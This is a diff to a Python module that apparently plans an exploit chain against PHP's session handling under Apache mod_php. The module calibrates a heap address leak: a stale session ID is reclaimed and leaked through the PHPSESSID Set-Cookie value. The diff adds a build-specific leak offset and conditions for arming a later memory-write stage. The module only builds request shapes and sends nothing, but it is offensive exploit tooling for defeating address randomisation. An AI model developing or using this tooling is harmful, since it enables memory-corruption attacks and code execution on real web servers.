@@ -11,9 +11,12 @@ The plan follows blueprint section C: producer exchange P, reclaim exchange R
 in the Cookie header), leak read L, percent decode of the Set-Cookie value,
 chunk-base and libphp-base candidate checks, and a stability stop rule.
 
-leak_offset is a live measurement. The address profile carries
-TBD_measure_live_probe until the live sweep lands a value; the dry plan surfaces
-that as status unknown and never substitutes a guessed offset.
+leak_offset is a per-build measurement. addresses/apache_libphp.json carries
+0x2188, the decoded session array offset from the Zend heap chunk base measured
+on the PHP 8.5.10 NTS mod_php build (libphp md5 92f76e84a77bf8b56c45c3868fa29a6c);
+its leak_offset_binding block records the object, formula, channel, evidence and
+build. Other profiles may still carry TBD_measure_live_probe; the dry plan
+surfaces an unknown offset as status unknown and never substitutes a guess.
 
 No transport: this module builds request shapes and the calibration algorithm
 description only. The driver rejects --live for this step.
@@ -183,25 +186,32 @@ def engine_addresses(profile: dict, profile_path: Path) -> dict:
 
 
 def leak_offset_hook(profile: dict, profile_path: Path) -> dict:
-    """Measured leak offset slot: TBD stays unknown, never guessed."""
+    """Measured leak offset slot: unknown stays unknown, never guessed."""
     raw = profile.get("leak_offset")
     value = _hex_int(raw)
+    binding = profile.get("leak_offset_binding")
     if value is None:
         return {
             "field": "leak_offset",
             "value": raw,
             "status": "unknown",
             "usable": False,
+            "build_specific": False,
+            "binding": binding,
             "source": str(profile_path),
-            "note": "TBD_measure_live_probe: the live sweep must land a measured "
-                    "offset; the dry plan does not substitute one",
+            "note": "TBD_measure_live_probe or absent: the live sweep must land "
+                    "a measured offset; the dry plan does not substitute one",
         }
     return {
         "field": "leak_offset",
         "value": f"0x{value:x}",
         "status": "measured",
         "usable": True,
+        "build_specific": True,
+        "binding": binding,
         "source": str(profile_path),
+        "note": "one build only: the offset is allocation geometry, not a "
+                "constant; matching requires the binding build and mapping",
     }
 
 
@@ -210,6 +220,7 @@ def calibration(profile: dict, addresses: dict, leak_offset: dict) -> dict:
     size_bytes = profile.get("size_bytes")
     p_align = _hex_int(profile.get("p_align"))
     return {
+        "leak_offset_binding": profile.get("leak_offset_binding"),
         "channel": {
             "emit": "session machinery Set-Cookie PHPSESSID",
             "encoder": "php_url_encode",
@@ -221,6 +232,9 @@ def calibration(profile: dict, addresses: dict, leak_offset: dict) -> dict:
             "decode": "percent-decode every %XX; php_url_encode escapes bytes "
                       ">= 0x80 and specials, so the decode is 1:1",
             "carrier": "Cookie: PHPSESSID only (session.use_only_cookies=1)",
+            "leak_offset_note": "0x2188 binds the decoded session array to the "
+                                "chunk base; the Set-Cookie PS(id) pointer "
+                                "offset is not separately measured",
         },
         "sequence": [
             {"phase": "P", "purpose": "producer request, leaves stale PS(id)"},
@@ -277,8 +291,13 @@ def calibration(profile: dict, addresses: dict, leak_offset: dict) -> dict:
              "check": "same sid requests time out on the session file lock",
              "action": "keep a fresh sid except in the deliberate stale stage"},
             {"mode": "leak_offset_unknown",
-             "check": "address profile leak_offset is TBD_measure_live_probe",
+             "check": "address profile leak_offset is TBD or absent",
              "action": "run the live sweep first; the write stage cannot arm"},
+            {"mode": "leak_offset_wrong_build",
+             "check": "the target libphp md5 or mapping differs from "
+                      "leak_offset_binding.build",
+             "action": "re-measure the allocation geometry; the offset is not "
+                       "portable across builds or mappings"},
         ],
     }
 
